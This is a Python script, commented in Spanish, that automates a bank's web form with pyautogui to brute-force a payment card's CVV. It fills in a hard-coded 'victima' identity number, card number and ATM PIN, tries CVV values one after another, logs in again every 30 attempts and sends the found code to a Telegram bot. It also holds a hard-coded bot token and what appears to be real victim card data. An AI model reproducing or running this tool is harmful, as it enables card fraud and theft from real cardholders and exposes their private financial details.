import pyautogui as robot
import time 
import telegram

afiliacion = 1622,1009
tipodedocumento = 1427,572
click_dni = 1406,417
Ndocumento = 1430,639
Ntarjeta = 1446,704
Nclavecajero = 1420,907
CVV = 1529,798
continuar = 1640,995
reintentar = 1637,984
escape = 1895,87

# Este es miooo de hernyu
# no compartir por error, si eres alguien tmre me descuide 
bot_token = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
chat_id = '1850445278'
bot = telegram.Bot(token=bot_token)

victima_tar = "4919098228024051"
victima_dni = "16710726"
victima_pasw = "1306"
#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir datos

print("El programa trabaja de manera descendente 999...998...997...")
print("Programa de Hasen")
inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))
print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(2)
	abrir(tipodedocumento) # poner documento dni
	time.sleep(1)
	abrir(click_dni)
	time.sleep(0.3)
	abrir(Ndocumento)
	robot.typewrite(victima_dni)
	time.sleep(0.5)
	abrir(Ntarjeta)
	robot.typewrite(victima_tar)
	time.sleep(0.5)
	abrir(Nclavecajero)
	robot.typewrite(victima_pasw)
	time.sleep(0.5)

print(":D")
#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

logeo()
#ccv intento
abrir(CVV)
if inicio < 100:
	robot.typewrite("0")
	robot.typewrite(str(inicio))
	time.sleep(0.2)
else:
	robot.typewrite(str(inicio))
	time.sleep(0.2) #tipear

abrir(continuar)
time.sleep(0.5)
b = None
while b is None :
	aceptar = "Reintentar.png"
	b = robot.locateOnScreen(aceptar, grayscale=True, confidence=0.9)
	#print(b)
	if b == None:
		#print("chekando")
		time.sleep(0.1)
robot.moveTo(b)
robot.click(b)
time.sleep(1)


contador = 0 # para reiniciar 
registro = open("registro.txt","a")

try:
	while inicio>fin :  # >  < # desde 999 para abajo
		
		contador = contador + 1

		if contador/30 == 1 : # Reiniciar 
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(2)

			logeo() # Logeandose de nuevo

			print("Continuando...")
			contador=0

		print("Intentado con: ",inicio)
		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")
		inicio = inicio - 1

		time.sleep(0.1)
		#print("Borrando") ##################
		abrir(CVV)
		robot.press('backspace')
		robot.press('backspace')
		robot.press('backspace')
		time.sleep(0.1)
		#por si son bajos de 100
		if inicio < 100:
			robot.typewrite("0")
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #######################
		else:
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #########################
		#time.sleep(0.1)

		time.sleep(0.3)
		abrir(continuar)

		time.sleep(1.95)
		
		bandera = "flag"
		print("--------------------------------")
		while bandera == "flag":
			try:
				#Verificar desde un principio mejor:
				time.sleep(0.2)
				print("Verificando...")
				screenshot = robot.screenshot()
				#time.sleep(0.3)
				img = screenshot.getpixel((1445,429))
				#time.sleep(0.2)
				valor = robot.pixelMatchesColor(1445,429, (7,33,70))
				#print(valor)
				bandera = "noflag"
			except:
				#time.sleep(0.5)
				bandera = "flag"

		#print("no entre")
		#time.sleep(0.1)
		if valor == False: # Osea no es azul, sino blanco, encontraod!!!
			registro.close()
			bot.send_message(chat_id=chat_id, text = '-----------------')
			bot.send_message(chat_id=chat_id, text = 'CVV encontrada: '+str(inicio))
			bot.send_message(chat_id=chat_id, text = '-----------------')
			txt= "Encontradoooo"
			print(txt)
			#robot.alert("Encontrado!!!!")
			time.sleep(3)
			break
		else:
			print("cvv incorrecto")

		#Reintentando
		b = None
		while b is None :
			aceptar = "Reintentar.png"
			b = robot.locateOnScreen(aceptar, grayscale=True, confidence=0.9)
			#print(b)
			if b == None:
				time.sleep(0.3)
				#print("chekando")
		robot.moveTo(b)
		robot.click(b)
		time.sleep(1)

	print("Intentado con: ",inicio)
	registro.close()
	print("Programa finalizado con exito")
	#bot.send_message(chat_id=chat_id, text = 'Programa finalizado con exito')
	txt= "Programa finalizado con exito"

except:
	registro.close()
	#bot.send_message(chat_id=chat_id, text = 'Ocurrio un error, vaya a verlo')
	#robot.alert("ERROR")
	txt= "Error en el programa"
	print(txt)
	print("\nEl numero se quedó en: ", inicio)





